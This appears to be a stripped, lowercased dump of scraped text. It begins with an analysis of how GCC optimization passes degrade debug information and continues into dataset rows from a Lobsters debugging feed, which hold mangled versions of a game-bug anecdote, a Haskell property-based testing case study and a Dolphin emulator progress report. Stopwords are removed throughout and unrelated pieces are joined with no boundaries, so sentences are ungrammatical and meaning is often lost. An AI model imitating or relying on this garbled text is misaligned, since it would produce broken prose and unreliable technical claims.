aggregate argument splitting scalar adjusting caller impact debugging could possibly different treesra parameter transformation retain trace original parameter could variable location information generated way reconstructed original object even tracked replacement scalar parameter separately would require infrastructure somehow retain original parameter describe map replacement parameter osoptimizesiblingcalls optimizesiblingcalls passtailrecursion passtailrecursion passtailcalls passtailcalls optimize sibling tail recursive call enables two separate pass one attempt turn tail recursion loop mark nonrecursive tail call expander emits jump rather call neither transformation affect debugging within activation function affect debugging call stack may missing expected frame stepping tail call would require additional logic debugger call would return expected caller setting breakpoint entry point recursively tailcalled function may miss recursive tailcalls ostreeswitchconversion treeswitchconversion passconvertswitch passconvertswitch perform conversion switch initialization activates switch statement lowering alternative may efficient jump table decision tree otherwise used one lowering possibility us switch value shift count us bit test instead multiple equality test visible effect debug experience expected another turn switch statement case containing assignment constant variable array constant assignment variable indexed element array collapse code inrange case single block losing debug annotation might contain ultimately prevents stepping switch statement breaking case optimizedout assignment might preserved annotation lost altogether assignment handled transformation even though debug bind case lost bind introduced vta postswitch phi node enable variable inspected afterwards ospartialinlining partialinlining passsplitfunctions passsplitfunctions perform partial inlining flag enables splitting function part inlined another part remains separate line function theory nt problem debugging inlined part represented inlined function part remains line split represented line function ala simple line portion recognized part function enclosing context taken inlined portion standardized representation could enable debugger recognize relationship least going confusion stack frame incoming argument available variable split context partial function output optimized version original function debugger might also set breakpoints entry point entry point entire function debug info extension proposal enable least entry point line part regarded entry point entire function alleviates breakpoint setting problem may still need annotation allow debugger represent single virtual call frame inlined portion activates line one entire set enclosing variable whatnot without flag make debugging difficult osipaicf ipaicf passipaicf passipaicf perform identical code folding function readonly variable pas identifies readonly variable identical representation function equivalent executable code output one copy disaster debugging discarded function line number variable location information dropped selected function equivalence group even confusing wrong function seems called stepping dropped one unexpected breakpoint hit may occur room improvement hardly trivial generate debug information copy nt want compile way end attempt unify label whatnot output location list variant multiple line number table unifying function combining turning debug annotation including source location conditionals identify unified copy could enable u compile normally emit single line number table augmented conditionals location information separate copy debug information consumer may able identify copy using return address callgraph debug information machinery used determine entryvalues parameter osdevirtualize devirtualize passipadevirt passipadevirt try convert virtual call direct one replaces indirect call direct call possibly enabling folding inlining whatnot replacement call affect debugging enabled transformation might osdevirtualizespeculatively devirtualizespeculatively passipadevirt passipadevirt perform speculative devirtualization somewhat like devirtualize direct call guarded test confirms selected target call correct one indirect call remains alternative nothing would affect debugging osipacp ipacp passipacp passipacp perform interprocedural constant propagation pas collect plenty information opportunity propagating constant caller callees cloning function replacing parameter constant known property may make room many optimization including resolution indirect call direct one cloning substitution impact significantly debug experience clone refer back original function abstract origin substituted parameter even eliminated cloned function abi noted bound constant debug info concrete function one potentially confusing situation arises cloning set breakpoint code address surprised hit activation function use clone since also come traditional transformation inlining loop unrolling probably wo nt surprising osipabitcp ipabitcp passipacp passipacp passccp passccp perform interprocedural bitwise constant propagation flag extends ipacp osipacp also gather information bit known zero value passed one function another creates additional opportunity folding treeccp ogtreeccp etc osipavrp ipavrp passipacp passipacp perform ipa value range propagation flag extends ipacp osipacp also gather range information value passed one function another creates additional opportunity folding treevrp ostreevrp etc osinlinesmallfunctions inlinesmallfunctions passipainline passipainline integrate function caller code size known grow like inlinefunctionscalledonce flag enabler inlining active various case early inlining splitting partialinlining ospartialinlining suppressed osindirectinlining indirectinlining passipainline passipainline perform indirect inlining like inline flag flag enabler active stop compiler short attempting resolve indirect edge eg indirect virtual call direct edge osinlinefunctions inlinefunctions passipainline passipainline integrate function declared inline caller profitable like inline flag flag enabler active stop compiler considering inlining function explicitly declared inline see inlinefunctionscalledonce analysis impact inlining debugging oshoistadjacentloads hoistadjacentloads passphiopt passphiopt enable hoisting adjacent load encourage generating conditional move instruction flag modifies ssaphiopt pas move conditional branch load adjacent field struct different ssa name joined variable one load block else block debug bind likely follow original load move wo nt change ability inspect destination variable load however early overwriting variable make previous value unavailable sooner expected move could leave conditional block empty especially conditional move end used could make impossible set breakpoints line within singlestep sfns get dropped along removed block moved load retain location information however one might able stop even conditional block executed include line get confusing nt see way improve osisolateerroneouspathsdereference isolateerroneouspathsdereference passisolateerroneouspaths passisolateerroneouspaths turn undefined behavior trap pas detects dereferences null pointer replaces trap statement deference involves phi node incoming edge carry null value redirected copy block copy get trap statement instead affect debugging mostly minor way chunk code follows unconditional null dereference may become unavailable breakpoints trap enables completely optimized away block copied case conditional null dereferences reference copied label name may resolved corresponding location copied block extreme case remaining incoming edge bring null value original block may end unreachable optimized away potentially making label unavailable even copy thereof remain indirect call replaced trap say callee address null debugger user may surprised allowed step called function even modify pointer null call turned trap type debugging session involving debuggingtime modification pointer compiletime could determined evaluate null may become impossible carry transformation flag well isolateerroneouspathsattribute wnulldereference though warning flag enable optimization enable turning divide zero trap unless noncallexceptions enabled logic consequence address local automatic variable returned function null effect debugging flag isolateerroneouspathsattribute us logic machinery option recognizes case null pointer passed function argument marked attribute requiring nonnull pointer returned function marked returning nonnull pointer replaces erroneous call return trap effect transformation debugging essentially kind ostreepre treepre passpre passpre enable ssapre optimization tree expression computed redundantly block predecessor make fully redundant inserting predecessor remove redundant computation theory insertion effect debugging ssa coalescing may cause overwrite variable earlier expected making unavailable inspection expected assignment point removal preserved debug bind long computation optimized representable sfn lvu bind available inspection expected spot oscodehoisting codehoisting passpre passpre enable code hoisting equivalent expression computed multiple block move dominating block remove redundant computation consideration apply treepre ostreepre also apply flag ostreetailmerge treetailmerge passpre passpre enable tail merging tree option conceptually similar crossjumping oscrossjumping work gimple ssa representation rather rtl subpass end ssapre ostreepre oscodehoisting despite name merges entire basic block share common successor predecessor consideration also similar apply combined block may refer different source fragment may different debug annotation correctly ignored comparing block dropped altogether one pair merged block envision possibility preserving annotation introduction conditionals though unlike case jump threading immediately obvious identify condition might available run time could used tell set annotation activate enable debugger show one source fragment another active osstoremerging storemerging passstoremerging passstoremerging merge adjacent store combine multiple store adjacent overlapping memory location single basic block fewer wider store done gimple automatic variable assigned specific stack slot unlikely combine effect one user variable might combine access single array structure ie larger addressable object committed memory early compilation object tracked affected vta debug bind unlikely affected however postponement merged store may affect value visible inspection point derived statement boundary sfn osthreadjumps threadjumps passjump passjump perform rtl jump threading optimization jump threading pass subpasses gimplessa enabled expensiveoptimizations osexpensiveoptimizations treedominatoropts treevrp ostreevrp block found side effect entered certain edge implies always left edge cleanup pas redirects edge destination bypassing block altogether remove expected flow marker binding found bypassed block may confusing singlestepping program unexpected jump reasonably large piece code might take place also bypassed block skipped binding may integrated subsequent view osgcse gcse passrtlpre passrtlpre passrtlhoist passrtlhoist passrtlcprop passrtlcprop perform global common subexpression elimination pre hoist pass rtl introduce new pseudo hold redundanthoisted expression new insns compute needed make exprs fully redundant replaces redundant set insns copy new pseudo since value still end regs debug bind referencing unchanged remain valid register allocation might able optimize away copy sfn lvu still possible stop assignment inspect assigned value expected negative effect debugging experience early overwriting variable new pseudo assigned location dead variable whose future value hold another pas enabled flag constantcopy propagation rtl pas pseudo replaced constant pseudo may simplify remove conditional branch get unreachable basic block removed may prevent breakpoints set source code range corresponding removed block trapping insns may also turned unconditional trap making subsequent code unreachable similar consequence insns may become dead pseudo set replaced might cause debug bind referencing reset setting expression preserved propagating debug bind creating debug temporary may result loss debug locationvalue information gcselm pre may pull load loop replacing store copy pseudo immediately followed newlyinserted store pseudo may impact debugging variable live memory loaded within loop debugger used modify value variable may fail affect program irahoistpressure hoist change weighting decision whether hoist computation dominating block nt cause different kind transformation done kind effect debugging experience remain unchanged osreruncseafterloop reruncseafterloop passcseafterglobalopts passcseafterglobalopts passcse passcse add common subexpression elimination pas loop optimization run rtl common subexpression elimination pas optimization enabled another rtl global optimization gcse osgcse cprop hoist pre gcsesm store motion never enabled implicitly ran made change flag add another pas rtl loop optimization cse scan block linearly detecting equivalent expression stored different pseudo replacing us laterset pseudo us earlierset equivalent one may render later set trivially dead ultimately removed register replacement per se affect debug experience dead insn removal might debug bind replaced well main issue potential early overwrite making variable unavailable inspection removal insns inspection point made sfn lvu debugger support register replacement might make evident conditional branch always never taken turning unconditional edge entire block might become unreachable might prevent breakpoints set within block since condition led never held would never reached anyway cse also combine condition codesetting insns one block performs compare flow another performs compare effect debug experience oscsefollowjumps csefollowjumps passcseafterglobalopts passcseafterglobalopts passcse passcse running cse follow jump target flag extends cse pas see reruncseafterloop osreruncseafterloop register set one block used substitution subsequent block predecessor path setting point change effect cse may debug experience extends effect across separate block osdce ud dce ud passudrtldce passudrtldce use rtl dead code elimination pas flag enabled default uddce pas described herein activated optimizing level higher pas relies usedef chain mark defs use remove unmarked insns resetting debug bind refer defs removed insns would possible preserve defs debug temp use bind instead resetting loss debug location would avoided pas cause variable lose binding oscallersaves callersaves passira passira save register around function call without flag pseudo live across function call assigned callclobbered register may end register saved stack slot needed call restored needed us case debug bind reference register point register might clobbered adjusted refer stack slot since vta notice save restores realizes register stack slot hold value regard callclobbered register call end variable location reflect saving restoring allows variable assigned callclobbered register inspected even live stack slot modifying variable debug session however guaranteed work variable tracking find copy gcc regard primary one one notice copy may longer hold current value point seek alternate location holding debug information may suggest modifying memory slot change variable even though variable already loaded register wo nt reloaded memory viceversa callersave implementation might able overcome issuing note used variabletracking enforce location change osipara ipara passira passira passfinal passfinal use caller save register across call possible flag gather information callclobbered register may actually modified function allows register allocator caller select register would otherwise avoid hold value across call known modify register effect debugging experience oslraremat lraremat passira passira cfgsensitive rematerialization lra pas recomputes value spilled register instead loading back memory make confusing debugging session spilled register hold variable modified debugger available memory expectation modified value would used subsequent us met point rematerialization variable seem magically take original value back situation entirely uncommon optimized debugging considering take note one location variable time nt indicate whether location modifiable one particularly apparent worth noting case tracking potential location remarkably expensive might able mark binding statement modifiable location clear indication location expression modified would likely quite useful avoid misleading behavior might also limit severely possibility modifying variable debug session one try get away oscrossjumping crossjumping perform crossjumping optimization pas identifies common trailing insns predecessor block leading insns successor block splitting one block equivalent insns replaced jump transformation ignores debug location marker bind needed g affect codegen make unify insn sequence refer different portion source code even one affect different variable user debugger may find wondering ended certain point program without hitting earlier breakpoint expected elsewhere marker bind reflect apparent source location even code reached different path unrelated computation happened become instruction may seem le confusing unless one realizes code sequence equivalent running unrelated path source program realization confusion even thorough loss bind marker make expectation happen dropped path unlikely met said likelihood completely unrelated computation unified pas low trailing compare jump perhaps preceded code sequence performing identical computation point storing result register likely dissimilar enough make debugging impossible aside effect seemingly finding oneself wrong part program thus even though confusing transformation theoretically possible odds transformation result may recognizably similar would expected real surprise unexpected jump inability set breakpoints instead dropping bind marker range unified conditional bind marker could introduced used enable debugger distinguish unified path side effect expected path suggested ipaicf osipaicf enable rtl peephole pas peephole pass run close end compilation looking sequence insns backend recognizes special treatment pas enabled flag turn sequence insns another sequence insns unlike peephole ogpeephole output alternate assembly code recognized sequence within final pass run late debug insns already turned note note skipped recognizing sequence unlike peephole however discard note appear among recognized insns may ultimately discard debug location marker note whereas peephole move replacement insns sequence cause degradation debug information leading missed incorrectlyplaced binding inspection point unexpected value found inspecting affected variable reschedule instruction register allocation pas computes dependency insns reorder better use hardware unit hide latency following assessment impact based standard insn scheduler used gcc extended basic block scheduler opposed selective scheduler largely incompatible debug insnbased technology introduced improve debuggability optimized program debug insns bind statement marker retained order bind carry preceding insn dependency addition dependency bound value otherwise debug insns pulled ahead nondebug one nondebug insns however never regarded dependent debug one even antidependencies nondebug insn modifies input debug bind reset bind loses debug information bound value might still available alternate location expression attempt made find alternate representation binding pas another potentially lossy situation moving insn overwrites variable expected may cause earlier value longer available inspection without sfn support debugger insn scheduling common cause undesirable effect jumping back forth singlestepping optimized program sfn debugger advance one line another according expected control flow lvu observe side effect noted preceding debug bind even insns carry side effect moved elsewhere osalignloops alignloops passcomputealignments passcomputealignments align start loop effect debugging osalignjumps alignjumps passcomputealignments passcomputealignments align label reached jumping effect debugging osalignlabels alignlabels passcomputealignments passcomputealignments align label effect debugging osalignfunctions alignfunctions passcomputealignments passcomputealignments align start function effect debugging osreorderfunctions reorderfunctions varasm varasm reorder function improve code placement decides whether emit start function hot cold section effect debugging perform optimization tend make program run faster option set optimization level mode assigns higher priority making code run faster noinlinefunctions passipainline passipainline although appears o o crescendo optimization level o o enable inlinefunctions nt optimizestrlen passstrlen passstrlen enable string length optimization tree patch track string memory call well char store keeping track string length optimize builtin call involving length constant previouslycomputed value besides strlen str strchr str length optimize strcat strcpy even memcpy transformation may involve removing redundant computation possibly inserting simpler call sequence replacing call assignment ultimately return value call stored ssa name transformation also store possible however specific case folding strstr strncmp strlen result strstr call stored user variable used compare transformation take place invalidate debug bind variable nt seem case result might stored user variable could lost transformation potential surprise debug session attempting step call since different function may called reason setting breakpoints function one explicitly called one may end called instead yield surprising result scheduleinsns passsched passsched reschedule instruction register allocation see analysis pas run mapping pseudo register hardware register stack slot one run virtually infinite pseudo register file pseudo register le likely hardware one overlap conflict scheduling insns register allocation reset fewer debug bind scheduling register allocation furthermore earlier scheduling reduces amount scheduling done later help preserve debug bind reorderblocksalgorithmstc passreorderblocks passreorderblocks set used basic block reordering algorithm stc stc algorithm unlike default simple one may duplicate block rotate loop still without significant effect debug experience perform expensive optimization might even make program larger slower option set optimization level passcompleteunroll passcompleteunroll optimization level higher loop peeling complete unrolling see peelloops permitted grow code size affect debugging computation iteration count loop property may simplified using evolution loop invariant outer loop enabling loop transformation might otherwise performed specific case whose effect debugging different transformation could performed regardless treeloopvectorize passvectorize passvectorize enable loop vectorization tree flag activated treeloopoptimize activated flag enables treeloopifconvert passchvect passchvect along treech ogtreech enables chvect pas ogtreech passipaincreasealignment passipaincreasealignment along sectionanchors enables increasealignment pas increase without impact debugging alignment global array loop vectorized transformation regardless selected cost model combine multiple iteration loop one us vector operation perform equivalent work combined iteration extremely confusing debugging significant control flow change also debug annotation used counter effect optimization debugging discarded disabled might possible aggregate unroll debug annotation multiple iteration end vectorized iteration make effect progressively visible singlestepping marker vectcostmodeldynamic passvectorize passvectorize passslpvectorize passslpvectorize use dynamic cost model vectorization affect treeloopvectorize treeslpvectorize decision kind transformation make ipacpclone passipacp passipacp perform cloning make interprocedural constant propagation stronger flag disabled stop externallyvisible function versioned constant propagation disabling transformation enabled ipacp osipacp function conversely enabling introduce kind effect nt potentially observable ipacp enabled extends effect externallyvisible function inlinefunctions passipainline passipainline see inlinefunctions osinlinefunctions o o flag strict crescendo optimization flag o o enabled otherwise o o nt treepartialpre passpre passpre ssapre optimization tree enable partialpartial redundancy elimination consideration apply ssapre ostreepre also apply flag effect ssapre pas unswitchloops passtreeunswitch passtreeunswitch perform loop unswitching flag activated treeloopoptimize activated pas hoist invariant conditionals within inner loop using loop versioning create two version loop one value conditional deciding version loop enter may hoist conditionals outer loop without versioning outer loop simple enough one might expect early execution conditional confusing interactive debugging session actually transparent condition trivial compute moved without corresponding line number information executed part loop preheader original test removed either version loop rather replaced test trivially evaluates true false even end optimized sfn marker remains test version loop possible stop test point verify condition whatever path taken since block original loop remain least one loop version possible set breakpoints line loop transformation even line may duplicated singlestepping surprising guard conditional block stopped block entered expected impact transformation debug experience extremely low splitloops passloopsplit passloopsplit perform loop splitting flag activated treeloopoptimize activated turn loop conditional block controlling condition change value throughout iteration space two loop one conditional block us loop versioning create two copy loop using controlling condition decide version run connects exit first loop entry second adjusts exit condition first loop transition loop point condition switch force controlling condition block known value removing unused conditional block copy none transformation significant impact debuggability actual issue see probably little significance block duplicating infrastructure copy bind statement label declaration optimized away label bound within conditional block versioned discarded original loop label seem completely gone even though block containing still reachable one loop loopunrollandjam passloopjam passloopjam perform unrollandjam loop flag activated treeloopoptimize activated transformation unrolls outer loop jam multiple instance inner loop single loop change iteration sequence eg n n n n n n extremely disruptive debugging sort transformation effectively modifies order major block computation executed made existing infrastructure retain debug information across optimization considering limited kind computation may performed loop enable sort transformation seems might possible attempt output debug information would enable debugger emulate original loop nest evident current debug information format sufficiently expressive would worth trouble might useful able somehow represent kind loop transformation took place user understand actually going rather attempting pretend still running original loop nest treeloopdistribution passloopdistribution passloopdistribution enable loop distribution tree treeloopdistributepatterns passloopdistribution passloopdistribution enable loop distribution pattern transformed library call flag activated treeloopoptimize activated enable pas partition suitable inner loop two loop iteration space copying loop removing stmt remain one loop body multiple iteration different statement loop confusing debugging removed stmts cause debug bind reference reset make variable available one two iteration loopinterchange passlinterchange passlinterchange enable loop interchange tree flag activated treeloopoptimize activated transformation rearranges loop nest attempting swap induction variable pair loop nest change order nest iteration space walked confusing debugging swap replaces induction variable reset bind original one iteration variable visible within loop transformation make difficult debugging loop treeloopifconvert passifconversion passifconversion pas enabled default treeloopvectorize enabled activated treeloopoptimize also activated transforms multiblock loop body single basic block possibly versioning loop turning statement conditional block conditional statement make debugging hard reset debug bind loop rearranges control flow conditional block become unconditionally executed conditional bind marker might alleviate enabling block would nt executed without optimization skipped debugging predictivecommoning passpredcom passpredcom run predictive commoning optimization flag activated treeloopoptimize activated pas optimizes loop identifying analyzing dependence chain unrolling right number time reuse load stored value across iteration remove dead store removal dead store may confuse debugging session inspecting array show temporarilystored value removal load may confuse session modify array expecting modified value loaded used expectation may met value already loaded memory peelloops passcompleteunroll passcompleteunroll perform loop peeling amount copying block make loop body run linearly entering remaining loop block duplication cause harm debugging experience linearization initial iteration loop make room optimization could turn make debugging difficult treeslpvectorize passslpvectorize passslpvectorize enable basic block vectorization slp tree pas detects opportunity use vector operation instead multiple operation adjacent memory linear code although pas reset debug bind unlike loop vectorizer hardly matter combined operation often involve memory reference involve debug bind recombined timing effect diverges implied debug marker make debugging confusing splitpaths passsplitpaths passsplitpaths split path leading loop backedges flag activated treeloopoptimize activated pas duplicate basic block dominates loop latch end conditional may exit loop block close simple diamond control flow graph effect debugging aside need breakpoints duplicate block covering one code address gcseafterreload perform global common subexpression elimination register allocation finished although implementation pas gcse osgcse pre hoist pas focus exclusively eliminating load insertion deletion load us logic thus effect debugging since pseudo introduced reload reuse register load copy done without regard debug bind register must live reused implies could nt used debug bind impact limited early unavailability variable happened available register computable expression involving ofast ofast fast perform expensive optimization also unsafe math transformation could make standardcompliant program misbehave option set optimization level also enabling fastmath option ofastfastmath fastmath fastmath fastmath flag enables multiple option disable various aspect floatingpoint strict correctness several may allow simplification would otherwise take place folding removal exception handling region could catch floatingpoint exception simplification though enabled flag kind could possibly arise absence flag impact debugging experience thus regarded low ofastreciprocalmath reciprocalmath passcsereciprocals passcsereciprocals allow optimization floatingpoint division may change result operation due rounding optimization substitute floatingpoint division ssaname multiplication reciprocal squared divisor also detected factored reciprocal ssaname square needed inserted definition division division turned multiplication place effect debugging highlight analyzed optimization diverse hardly possible summarize various form impact debug information pass good news finding probably surprising anyone familiar internal behavior pass technique used mask effect optimization debugging however finding consider surprising positive negative way number highlighted issue fixed without much effort others require far elaborate work others yet may border unfixable surprised throughout analysis seamless introduction vta turned especially gimple pass required additional logic adjust debug bind nearly every case decision disregarding debug bind adjusting like nondebug stmts insns favored logic detected coped debug us dead pseudo rtl dealt adjustment debug bind sometimes inserting debug temp moving removing assignment gimple rtl reviewing pass realized may room improvement moving ssa defs dominating block mean signal detect internally move require adjustment would avoid unnecessary forward propagation introduction debug temp carry risk loss debug information case ssa defs removed new equivalent defs inserted nearly point eg replacing phi node assign also improved option wnulldereference enables isolatepaths pas osisolateerroneouspathsdereference may codegen effect eg changing return address local automatic variable null even isolateerroneouspaths flag supposed enable codegen change pas disabled another case hard fix lack adjustment debug bind autoincdec ogautoincdec although og supposed avoid harming debugging enables delayedbranch ogdelayedbranch move insns without regard preserving correctness previouslycomputed variable location potential harmful effect branch call probably enabled og late optimization pass may corrupt variable location peephole ogpeephole also og o run variable tracking adjusting debug bind recompute location much option adjusting note might possible significant effort may actually drop note apear peepholed insns hard argue something else would uniformly superior pass limited target architecture effect affected architecture could significant pass may break variable location information move remove memory store addressable variable subject debug bind change actually make effect observable unexpected point flag treedse ogtreedse treesink ogtreesink enable optimization implied og flag treeloopvectorize treeslpvectorize enabled may bring similar effect variable memory hardly expectation retaining significant debuggability still might worth exploring possibility extending vtalike tracking nonscalar variable besides late tracking addressable variable become nonaddressable scalar due optimization might help mask optimization effect splitwidetypes ogsplitwidetypes treesra ipasra osipasra introduce scalar late ensure debug bind created correct point furthermore whatever support track splitout component separately able describe aggregate location memberwise seems task effect ipa sra debugging even worse dismembered params end represented clear mean express apparently dropped parm composition actual parms extension might required even start fixing ipa sra several optimization reorganize control flow graph may drop debug marker bind gimple jump threading example wo nt duplicate forwarding block discarding debug stmts case would nt hard retain predecessor successor block others way mark stmts conditional might way preserve conditional bind handled effort vartracking existing location expression list conditional marker would require extension line number table enable debug information consumer decide eg whether breakpoint line hit reaching conditional marker line could become large project significant expected benefit extension could benefit many pass rtl threadjumps osthreadjumps ifconversion ssaphiopt crossjumping oscrossjumping treetailmerge ostreetailmerge even loop optimization treeloopifconvert bit surprised find number loop optimization harm debugging expected loop unrolling would harmless splitloops unswitchloops peelloops also found affect debug information unlike transformation modify order point iteration space visited loopunrollandjam treeloopvectorize another somewhat surprising effect induction variable optimization loop particularly branchcountreg risk losing binding userdefined induction variable even expressed term remaining basic induction variable userdefined induction variable longer needed effort adjust debug bind insns accordingly room improvement without much effort partial inlining brings significant challenge debug information representation although function fragment linked back original abstract function set variable take location value caller expressing concrete subprogram fragment contain entry point function requires extension would take extension express inlined subroutine combine fragment form entire abstract subprogram even support multiple split subprogram similar mechanism could also represent openmp function fragment identical code folding ipaicf osipaicf another challenging case debugging single executable code sequence may used represent multiple unrelated function requiring separate set debug annotation one potential way address combine debug note marker bind function share executable code making note conditional dwarf procedure determine combined function active eg caller point mean tell apart ideally symbolic information function could kept separate guarded conditionals scope variable activated function considered available require extension debug information representation convention changelog sfns available c c far improved wording fixed spelling moved callersaves right place split peephole reorganize cse order link mention crescendo sooner name pass option paragraph added anchor reorganized earlier one added intext link check anchor used link dangling draft introduced section structure section name pas name next flag pas list toc added info tell whether pas run highlighted case addressable variable becoming scalar benefitting bind nonscalars added changelog draft first published draft based gcc
191,Lobsters,debugging,Debugging,The bug I wish I hadn’t caught,https://roganmurley.com/2019/06/08/the-bug.html,bug wish caught,ring world sign play,catch bug release usually glad narrowly averted ruining someone experience eating data today found bug wish caught bug wish released wild witness full glory found bug digital card game ring world tell story diligent player grinding cpu player experience point making good progress enough want much wonder much experience cpu must playing everyone else rest must quite lot try look cpu stats find something cpu account account real player experience go void play many game get experience tough break late night get mischievous idea open computer creates account account name cpu literally nothing next day cpu account opposite nothing eating experience hour via robot slave becomes behemoth leveled others yet still control top world oops turn player looked username even ai account harvest ai experience creating account username silly artefact left real player account everything dropindropout player hide fear nobody hope match experience dreaded cpu one day new challenger arises account named guest turn people play lot game signed cpu guest become locked eternal war experience supremacy least ban unfortunately actually occur caught bug release wish fact tempted close eye pretend seen anything fancy hoarding sweet experience sign play
194,Lobsters,debugging,Debugging,"Property-Based Testing in a Screencast Editor, Case Study 3: Integration Testing",https://wickstrom.tech/programming/2019/06/02/property-based-testing-in-a-screencast-editor-case-study-3.html,propertybased testing screencast editor case study integration testing,introduction timeline flattening video scene classification history two stack performing action undoing action redoing action dealing performance problem refactoring propertybased integration test inverse undoredo test test passing everything work test property buy book ebook leanpub,last article looked komposition automatically classifies moving still segment imported video medium went ineffective testing eye finding curious bug using propertybased testing pbt read preceding post encourage check first introduction timeline flattening video scene classification final case study testing screencast series cover propertybased integration testing value aggressive refactoring work within komposition history two stack komposition state represented using inmemory data structure contains hierarchical timeline focus import render setting project storage file path let user navigate backwards forward history project edits example made mistake komposition supply undo redo command undoredo history previously implemented data structure recording project state compromised current state variable stack previous state stack possible future state undoredo history data structure held entire project state value undoable redoable user action created new state value look bit closer worked performing action user performed undoableredoable action undoredo history would push previous state onto undo stack perform action replace current state discard state redo stack visualized following diagram state replaced new state h pushed onto undo stack undoredo history left dividing line original one right resulting history performing action push previous state onto undo stack discard redo stack note performing new action discarded state redo stack undoing action user chose undo action undoredo history would pop undo stack use state current state push previous state onto redo stack following diagram show undoing last performed resulting state push onto redo stack pop c undo stack use current state undoing push previous state onto redo stack pop undo stack current state redoing action user chose redo action undoredo history would pop redo stack use state current state push previous state onto undo stack last diagram show redoing recovering previously undone state pop g redo stack use current state push previous state onto undo stack undoing push previous state onto redo stack pop undo stack current state note user action komposition undoableredoable action like navigating focus zooming recorded history dealing performance problem stack algorithm easy understand implement failed meet nonfunctional requirement screencast project compromised hundred thousand small edits would consume gigabyte disk space stored take ten second load disk consume many gigabyte ram memory might think implementation incredibly naive performance problem could fixed careful profiling optimization probably right consider going route optimizing code timewindowing edits compact history fly capping history fixed size would interesting pursuit end decided try something else refactoring propertybased integration test instead optimizing current stackbased implementation decided implement undoredo history term inverse action model action modify project state also return another action inverse revers effect original action instead recording new project state data structure edit history record description action realized early introducing new undoredo history implementation komposition going small task would touch majority command implementation code large part main application logic project binary serialization format affect though module describing user command abstract provide safety net refactoring decided cover undoredo functionality test user command would stay throughout modification chose test level characterized integrationlevel testing test run komposition including toplevel application control flow user interface effect stubbed making application testable level hard work payoff huge komposition featuring close twenty type user command combined complex hierarchical timeline navigation model combinatory explosion possible state daunting relying examplebased test safeguard work satisfactory pbt cover entire state space either confident would improve chance finding actual bug undoredo test began refactoring added test inverse property undoableredoable action first test focus undoing action structured follows generate initial project application state generate sequence undoableredoable command wrapped event run application initial state generated event run undo command original command assert final timeline equal initial timeline look haskell hedgehog property test hpropundoactionsareundoable property generate initial timeline focus timelineandfocus forallwith showtimelineandfocus gentimelinewithfocus rangelinear genparallel initial application state initialstate forall initializestate timelineandfocus generate sequence undoableredoable command event forall genlist rangeexponential genundoabletimelineevent run event original state beforeundos runtimelinestubbedwithexit event initialstate run many undo command undoable command afterundos runtimelinestubbedwithexit undoevent event beforeundos result timeline equal one started timelinetotree initialstate currenttimeline timelinetotree afterundos currenttimeline second test focusing redoing action structured similarly previous test generate initial project application state generate sequence undoable command wrapped event run application initial state generated event run undo command original command run redo command original command assert final timeline equal timeline undoing action test code also similar hpropundoactionsareredoable property generate initial timeline focus timelineandfocus forallwith showtimelineandfocus gentimelinewithfocus rangelinear genparallel initial application state initialstate forall initializestate timelineandfocus generate sequence undoableredoable command event forall genlist rangeexponential genundoabletimelineevent run event original state beforeundos runtimelinestubbedwithexit event initialstate run undo command corresponding original command afterredos runtimelinestubbedwithexit undoevent event beforeundos run redo command corresponding original command runtimelinestubbedwithexit redoevent event result timeline equal one undoing action timelinetotree beforeundos currenttimeline timelinetotree afterredos currenttimeline note test assert equality timeline entire project state undoable command operate timeline test passing everything work undoredo test written run original stackbased implementation kept around refactoring took two week hacking late night weekend finally run passing new implementation based inverse action except minimal adjustment data type test stayed untouched entire process confidence refactoring felt like super power two simple property test made undertaking possible found numerous bug including offbyone index error action modifying timeline inconsistent timeline focus focus incorrectly restored undoing action focus outside timeline bound noninverse action action returning incorrectly constructed inverse inverse splitting sequence joining sequence joining back always work test passed ran application gui edited screencast project worked flawlessly almost good true right property testing silver bullet might still bug lurking undoredo history implementation test run never going exhaustive generator might flawed said gave confidence refactoring never maybe hit disastrous edge case yet test property last case study testing screencast series great time writing article giving talk subject wrap summarize thought pbt general experience komposition propertybased testing pure function use test effectful action unit testing write integration test using property functional programming language good framework popular programming language property describe general behavior system test verify correctness using variety input effective way finding error also concise way documenting system iterative process propertybased testing experience come following step think specification system test think generator test work write modify generator test implementation code based step get minimal example failing test repeat using pbt within komposition made possible confidently refactor large part application found error thinking generator test implementation code testing video scene classification went time consuming repetitive manual verification process fast effective automated task short joy look forward continue using pbt work project hope convinced value inspired try matter kind project working programming language using involve colleague practice writing property test together enjoy finding complicated bug user buy book series available ebook leanpub content mostly change bringing uptodate also already enjoyed article might want support work purchasing book finally might enjoy nicely typeset pdf epub book web page
195,Lobsters,debugging,Debugging,Dolphin Progress Report: May 2019,https://dolphin-emu.org/blog/2019/06/02/dolphin-progress-report-may-2019/,dolphin progress report may,three year ago ubershaders bluetooth passthrough hybrid xfb emulated motion plus ed edd eddy misedventures resident evil latest development build download page notable change last month billiard billiard three taiko tatsujin billiard taiko tatsujin cubeb audio backend iwubcode leoetlino transfer bug leoetlino using wrong buffer size three bug libusb shape featuring jenny mccarthy leoetlino rockband karaoke revolution guitar hero game supported usb microphone update libusb situation highly passthrough libusbk winusb usbdk use bluetooth passthrough metroid prime trilogy vinduv american idol encore ten time faster star fox assault issue report three year ago star fox assault fix crash booto booto second per frame booto booto booto booto star fox assault booto star fox assault top three bit star fox assault star fox assault last month contributor contributor,past month quite hectic slew gigantic change requiring lengthy article alongside big feature hitting together seems brought talking point community would irresponsible ignore everyone want know dolphin coming dolphin launched nearly three year ago lack feature like ubershaders bluetooth passthrough hybrid xfb emulated motion plus list go unfortunately announce nt especially close release right release build exciting feature meant stable reliable highly compatible since dolphin lot minor major regression nt fully worked yet whether game like ed edd eddy misedventures hanging loading screen audio broken resident evil dozen hundred little issue take time effort address issue close resolved others nt even investigated yet ask user continue using latest development build continue reporting bug patient next release way time get may notable change always user want try feature download latest development build download page use autoupdater get new dev build every month automatically enjoy notable change last month billiard implemented third party encryption alongside emulated udraw tablet support billiard nt done actually second wii tablet lineup game competing tablet made ubisoft think would made udraw tablet given name actually produced thq instead ubisoft brought u drawsome tablet easily mistaken udraw tablet glance unfortunately ended tablet stuck library three game taiko tatsujin another game series support hardware attachment wii remote thus billiard wanted emulate device time talking game optional drumset accessory known japan tatacon become drum master bang way ton song frantic rhythm game lot closer original arcade experience simply pushing button wii remote thanks emulation using convenient original except nt even need worry battery wii remote course mapping emulated tatacon gamepad button different playing wii remote using switch tatacon transformative tatacon nt two button four drum rim divided middle thanks player navigate menu play entirely smacking tatacon like arcade modern tatacon try map onto simpler wii remote control ca nt navigate play config configure navigation separate controller proper emulation user navigate play modern tatacon matching menu boot wii tatacon rapidly disappear change help preserve proper wii taiko tatsujin experience year come bit odd 